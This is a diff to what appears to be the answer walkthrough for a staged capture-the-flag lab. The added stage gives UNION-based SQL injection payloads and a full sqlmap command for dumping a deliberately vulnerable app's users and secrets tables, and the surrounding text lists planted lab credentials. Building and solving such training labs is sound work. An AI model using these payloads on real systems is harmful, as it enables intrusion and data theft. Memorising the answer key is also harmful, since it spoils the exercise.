@@ -6,7 +6,7 @@
 
 ```bash
 python3 scripts/gen_flags.py       # mint flags -> challenges/.flags.json (git-ignored)
-python3 scripts/gen_artifacts.py   # build S1 eml, S3 pcap, S5 dump+wordlist, S2 cover+payload
+python3 scripts/gen_artifacts.py   # S1 eml, S3 pcap, S5 dump+wordlist, S4 seed/init.sql, S2 cover+payload
 scripts/embed_s2.sh                # OpenStego embed -> challenges/s2/network_diagram.png
 ```
 
@@ -36,6 +36,18 @@ required.)
 conversation shows the `POST /api/v1/login` with `k.fernando:Ceyl0nPay#2024`
 (zero, not O) and the S3 flag in the `X-Debug-Token` response header.
 → hands off: `/api/v1/login`, `k.fernando : Ceyl0nPay#2024`.
+
+**S4 — vulnerable web app (`s4_web` + `s4_db`).** Log in at the portal with the
+S3 credential, then exploit the UNION-based SQL injection in the `username`
+field of `POST /api/v1/login` (query has 3 columns: `id, username, role`).
+- Dump the users table (the S5 hand-off):
+  `zzz' UNION SELECT id, CONCAT(username,0x3a,password), role FROM users-- -`
+- Read the flag from the `secrets` table:
+  `zzz' UNION SELECT id, value, name FROM secrets-- -`
+- Or automate with sqlmap: `sqlmap -u http://<host>:8004/api/v1/login --method=POST
+  --data='{"username":"zzz","password":"x"}' --headers="Content-Type: application/json"
+  -p username --technique=U -D ceylonpay_app -T secrets --dump`
+→ hands off: the `users` table dump (unsalted MD5) into S5.
 
 **S5 — users_dump.txt.** Unsalted MD5s. `svc-deploy` cracks with the supplied
 `s5_wordlist.txt` to `Bl@ckout#Deploy1` (the S6 SSH password). `vault-service`
